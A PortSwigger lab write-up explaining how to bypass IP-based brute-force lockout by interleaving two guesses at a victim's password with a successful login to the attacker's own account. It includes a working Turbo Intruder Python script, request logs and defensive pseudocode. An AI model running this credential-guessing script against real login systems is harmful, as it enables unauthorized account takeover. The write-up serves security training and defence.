# Lab 6: Broken Brute-Force Protection via IP Block

## Executive Summary

This lab demonstrates a sophisticated brute-force protection bypass that exploits flawed account lockout logic. The application implements IP-based rate limiting that locks accounts after consecutive failed login attempts, but fails to distinguish between different usernames. By attempting two victim password guesses followed by a successful self-authentication, I successfully reset the lockout counter and maintained continuous attack capability. Using Burp Suite's Turbo Intruder extension with custom Python scripting, I automated this evasion technique and achieved complete account compromise despite active brute-force protections.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Broken Brute-Force Protection Logic |
| **Risk**               | High - Authentication Bypass via Protection Evasion |
| **Completion**         | January 3, 2026 |

## Objective

Bypass IP-based brute-force protection through protection logic exploitation, enabling automated credential attacks against rate-limited authentication endpoints to achieve unauthorized account access.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Turbo Intruder extension for advanced attacks
- Custom Python scripting for attack automation
- Session handling rules for macro execution

**Target:** Login functionality with flawed brute-force protection

## Exploitation Walkthrough

### 1. Environment Configuration

Accessed the lab environment displaying "Broken brute-force protection, IP block" challenge. Configured Burp Suite Professional for advanced attack testing.
<img width="1920" height="982" alt="LAB3_ss1" src="https://github.com/user-attachments/assets/194f0f98-8ef6-4cd8-bb74-dacde4e0f3f1" />

*Lab 6 environment - Broken brute-force protection with Burp Suite Professional configured*

### 2. Initial Authentication Testing

Submitted test credentials to capture authentication request structure and analyze protection mechanisms.

**Test Credentials:**
- Username: `adam`
- Password: `test`

<img width="1920" height="982" alt="LAB3_ss2" src="https://github.com/user-attachments/assets/0f983913-e8c5-417e-997f-2384af668905" />

*Invalid credentials captured in HTTP history - POST request showing username=adam&password=test in plaintext*

**Request Structure:**
```http
POST /login HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=adam&password=test
```

**Security Observation:** Credentials transmitted in plaintext without client-side encryption, enabling clear visibility of authentication parameters.

### 3. Brute-Force Protection Analysis

Sent captured request to Burp Repeater to systematically test protection mechanisms and identify bypass opportunities.

<img width="1920" height="982" alt="LAB3_ss3" src="https://github.com/user-attachments/assets/3ec0964b-f3f2-40f5-a2e5-25d992408920" />

*Brute-force protection testing in Repeater*

**Protection Mechanism Identified:**
- **Lockout Threshold:** 2 consecutive failed login attempts
- **Lockout Duration:** 1 minute account suspension
- **Scope:** IP-based tracking
- **Bypass Attempt:** X-Forwarded-For header manipulation ineffective

**Critical Finding:** Unlike previous labs, X-Forwarded-For header injection does not bypass the protection. The application properly validates IP addresses, requiring a different evasion technique.

**Protection Logic Discovered:**
```
Attempt 1 (failed) → Counter: 1
Attempt 2 (failed) → Counter: 2
Attempt 3 (failed) → Account locked for 1 minute
```

**Challenge:** Standard brute-force attacks blocked after 2 attempts, requiring sophisticated bypass methodology.

### 4. Password List Preparation

Created targeted password wordlist for attack automation.
<img width="1920" height="983" alt="LAB3_ss4" src="https://github.com/user-attachments/assets/c9596518-ab1a-4997-9224-003932373665" />

*passwords.txt file created on Desktop with targeted password list*

**Wordlist Configuration:**
- Location: `Desktop/passwords.txt`
- Content: Common passwords for targeted attack
- Purpose: Automated credential testing via Turbo Intruder

### 5. Advanced Attack Infrastructure Setup

**Extension Installation:**
Installed Turbo Intruder extension from BApp Store for advanced attack scripting capabilities.

**Session Handling Configuration:**
Configured comprehensive session handling rules to support complex attack logic.
<img width="1920" height="983" alt="LAB3_ss5" src="https://github.com/user-attachments/assets/3a79cbd0-b6fb-42dd-9233-c08ec0952a8d" />

*Session handling rule created with macro configuration*

**Configuration Details:**
- **Scope:** Scanner, Repeater, Intruder, Sequencer, BurpAI, Extensions
- **URL Scope:** Include all URLs
- **Rule Actions:** Macro execution enabled
- **Macro Setup:** Macro1 configured for authentication reset

**Purpose:** Enable automated session management and protection bypass logic during attack execution.

### 6. Turbo Intruder Attack Script Development

Sent login request to Turbo Intruder extension for custom Python attack script development.
<img width="1920" height="983" alt="LAB3_ss6" src="https://github.com/user-attachments/assets/b6175b55-5996-4b5c-8826-17f55fb99dab" />

*Turbo Intruder Python script configured with attack logic*

**Attack Strategy:**

**Protection Bypass Technique:**
The key insight is that successful authentication resets the failed attempt counter. By attempting two victim password guesses (staying under the 3-attempt threshold) followed by successful self-authentication, the lockout mechanism never triggers:
```
Attack Pattern:
1. Try carlos:password1 (failed) → Counter: 1
2. Try carlos:password2 (failed) → Counter: 2
3. Try wiener:peter (success) → Counter: RESET to 0
4. Try carlos:password3 (failed) → Counter: 1
5. Try carlos:password4 (failed) → Counter: 2
6. Try wiener:peter (success) → Counter: RESET to 0
7. Try carlos:password5 (failed) → Counter: 1
8. Try carlos:password6 (failed) → Counter: 2
9. Try wiener:peter (success) → Counter: RESET to 0
... continue until victim password found
```

**Python Script Implementation:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Load victim username
    victim_username = 'carlos'
    
    # Load my valid credentials for counter reset
    my_username = 'wiener'
    my_password = 'peter'
    
    # Iterate through password list
    passwords = list(open('/Users/username/Desktop/passwords.txt'))
    
    for i in range(0, len(passwords), 2):
        # Attempt 1: Try victim password 1
        password1 = passwords[i].strip()
        engine.queue(target.req, [victim_username, password1])
        
        # Attempt 2: Try victim password 2 (if available)
        if i + 1 < len(passwords):
            password2 = passwords[i + 1].strip()
            engine.queue(target.req, [victim_username, password2])
        
        # Attempt 3: Reset counter with valid credentials
        engine.queue(target.req, [my_username, my_password])

def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```

**Script Logic:**
1. **Victim Attempt 1:** Test first password from wordlist against victim account
2. **Victim Attempt 2:** Test second password from wordlist against victim account
3. **Counter Reset:** Authenticate with valid credentials to reset failed attempt counter
4. **Repeat:** Continue pattern for entire password list (2 victim attempts + 1 reset)
5. **Detection:** Flag 302 redirects indicating successful authentication

**Target Position Markers:**
- Username: `%s`
- Password: `%s`

This pattern exploits the protection's failure to track failed attempts per username, instead tracking them globally per IP/session. Two failed attempts stay under the threshold, and the successful login resets the counter completely.

### 7. Automated Attack Execution & Results

Launched Turbo Intruder attack with custom Python script, successfully bypassing brute-force protection through counter reset technique.
<img width="1920" height="983" alt="LAB3_ss7" src="https://github.com/user-attachments/assets/a6de2098-1385-4678-a705-a0094b5b4851" />

*Turbo Intruder attack results showing pattern - two victim password attempts followed by valid self-authentication reset | Valid credentials discovered: carlos/ranger with 302 response*

**Attack Pattern Observed:**
```
Request 1: carlos:123456 → 200 (failed, counter: 1)
Request 2: carlos:password → 200 (failed, counter: 2)
Request 3: wiener:peter → 302 (success - counter RESET to 0)

Request 4: carlos:admin → 200 (failed, counter: 1)
Request 5: carlos:letmein → 200 (failed, counter: 2)
Request 6: wiener:peter → 302 (success - counter RESET to 0)

Request 7: carlos:welcome → 200 (failed, counter: 1)
Request 8: carlos:monkey → 200 (failed, counter: 2)
Request 9: wiener:peter → 302 (success - counter RESET to 0)

...

Request N-1: carlos:ranger → 302 (SUCCESS - victim password found!)
```

**Successful Credential Discovery:**
- **Username:** `carlos`
- **Password:** `ranger`
- **Response:** 302 redirect to `/my-account`
- **Status:** Complete bypass of brute-force protection

**Attack Statistics:**
- Pattern: 2 victim attempts + 1 reset = 3 requests per cycle
- No account lockouts triggered (stayed under threshold)
- Protection mechanism completely evaded
- Continuous attack maintained throughout execution
- Valid credentials successfully identified

### 8. Account Takeover Confirmation

Authenticated to victim account using discovered credentials to validate complete compromise.

<img width="1920" height="983" alt="LAB3_ss8" src="https://github.com/user-attachments/assets/094bbd00-9892-4b9f-84d0-807154134bd0" />

*Turbo Intruder results showing successful discovery (left) | Victim account accessed with username carlos and email modification capability (right)*

**Complete Account Access Achieved:**
- ✅ Brute-force protection bypassed through logic exploitation
- ✅ Valid credentials discovered: carlos/ranger
- ✅ Full authentication successful
- ✅ Account dashboard accessible
- ✅ Email modification functionality available
- ✅ Complete control over victim account

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: High (CVSS 8.1)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

**Primary Vulnerability:**

**CWE-307: Improper Restriction of Excessive Authentication Attempts**
- Brute-force protection tracks attempts globally instead of per-username
- Successful authentication resets counter regardless of previous failed attempts against different accounts
- Protection logic exploitable through interleaved victim attempts and valid self-authentication
- No distinction between self-authentication and victim targeting

**Broken Protection Logic:**
```python
# VULNERABLE IMPLEMENTATION
failed_attempts = 0  # Global counter per IP

def authenticate(username, password):
    global failed_attempts
    
    if verify_credentials(username, password):
        failed_attempts = 0  # VULNERABILITY: Resets for ANY successful login
        return success()
    
    failed_attempts += 1
    
    if failed_attempts >= 3:
        lock_ip(1_minute)  # Locks based on global counter
        return locked()
    
    return failure()

# ATTACK EXPLOITATION:
# Attempt 1: carlos:wrong1 → failed_attempts = 1
# Attempt 2: carlos:wrong2 → failed_attempts = 2
# Attempt 3: wiener:correct → failed_attempts = 0 (RESET!)
# Attempt 4: carlos:wrong3 → failed_attempts = 1
# Attempt 5: carlos:wrong4 → failed_attempts = 2
# Attempt 6: wiener:correct → failed_attempts = 0 (RESET!)
# ... infinite attempts without lockout
```

**Secure Implementation:**
```python
# SECURE IMPLEMENTATION
failed_attempts = {}  # Track per username

def authenticate(username, password):
    if username not in failed_attempts:
        failed_attempts[username] = 0
    
    if verify_credentials(username, password):
        failed_attempts[username] = 0  # Reset only this username's counter
        return success()
    
    failed_attempts[username] += 1
    
    # Lock ONLY the target username, not entire IP
    if failed_attempts[username] >= 5:
        lock_account(username, 15_minutes)
        return locked()
    
    return failure()
```

**Attack Methodology Breakdown:**

| Cycle | Requests | Protection Response |
|-------|----------|---------------------|
| 1 | carlos:pass1, carlos:pass2, wiener:peter | Counter: 1, 2, RESET to 0 |
| 2 | carlos:pass3, carlos:pass4, wiener:peter | Counter: 1, 2, RESET to 0 |
| 3 | carlos:pass5, carlos:pass6, wiener:peter | Counter: 1, 2, RESET to 0 |
| N | carlos:ranger (success!) | Access granted |

**Why This Attack Succeeds:**

1. **Global Counter Flaw:** Protection tracks total failed attempts per IP, not per-username attempts
2. **Reset Logic Error:** ANY successful login resets the entire counter, allowing attacker to authenticate as themselves to clear victim's failed attempts
3. **No Username Isolation:** Failed attempts against victim account cleared by attacker's successful login
4. **Predictable Behavior:** Attacker maintains counter below threshold by periodically authenticating

**Real-World Attack Scenarios:**

| Target | Impact |
|--------|--------|
| **Banking Applications** | Account takeover despite "robust" protection |
| **Corporate Systems** | Administrative account compromise |
| **E-Commerce Platforms** | Customer account access for fraud |
| **SaaS Applications** | Business data exfiltration |
| **Email Services** | Communication interception |

**Attack Complexity:** High - requires understanding of protection logic, custom scripting, and advanced tool usage, but completely bypasses protection once identified.

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic analysis of security control logic
- Creative exploitation of implementation flaws
- Advanced tooling (Turbo Intruder) for complex attacks
- Custom Python scripting for attack automation
- Pattern recognition in protection mechanisms

**Critical Security Insights:**

**1. Per-Username Tracking is Mandatory:**
Brute-force protection must track failed attempts per target username, not globally:
- Vulnerable: Global counter for all usernames
- Secure: Individual counters per username
- Attacker's successful logins should never reset victim's failed attempt counter

**2. Protection Scope Must Match Threat Model:**
IP-based rate limiting alone is insufficient:
- Attackers control their own credentials
- Self-authentication shouldn't benefit attacks on other accounts
- Account-level lockouts required alongside IP limiting

**3. Defense-in-Depth for Authentication:**
Multiple layers required to prevent bypass:
- Per-username attempt tracking
- CAPTCHA after threshold
- Account lockout (not just IP lockout)
- Multi-factor authentication
- Anomaly detection (same IP, multiple accounts)

**4. Logic Flaws vs Implementation Bugs:**
This vulnerability represents flawed security logic, not a coding error:
- Code functions as designed
- Design fails to account for attacker capabilities
- Security controls must be threat-modeled thoroughly

**Professional Skills Demonstrated:**
- Advanced security control analysis
- Custom Python scripting for complex attacks
- Turbo Intruder proficiency
- Understanding of authentication protection mechanisms
- Creative problem-solving in bypass techniques
- Clear documentation of sophisticated exploitation

## References

1. PortSwigger Web Security Academy - Authentication Vulnerabilities
2. OWASP Top 10 (2021) - A07: Identification and Authentication Failures
3. CWE-307 - Improper Restriction of Excessive Authentication Attempts
4. NIST SP 800-63B - Digital Identity Guidelines
5. OWASP Authentication Cheat Sheet
6. Burp Suite Turbo Intruder Documentation

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems is illegal under applicable laws worldwide.
